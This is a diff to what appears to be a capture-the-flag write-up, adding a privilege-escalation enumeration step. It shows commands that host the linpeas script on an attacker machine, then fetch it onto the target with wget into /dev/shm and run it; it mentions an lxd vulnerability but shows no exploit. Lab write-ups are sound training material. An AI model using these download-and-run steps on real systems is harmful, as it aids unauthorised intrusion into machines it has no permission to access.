@@ -146,5 +146,31 @@ What is the user flag?
 
 Now we can do the further enumeration
 
+We run the linpeas in the server to find vulnerabities anf find their is lxd vulnerability.
+On attacker terminal
+```
+cd /usr/share/peass/linpeas
+python3 -m http.server 8000
+```
+On target
+```
+cd /dev/shm
+wget http://<your-IP>:8000/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh | tee linlog.txt
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
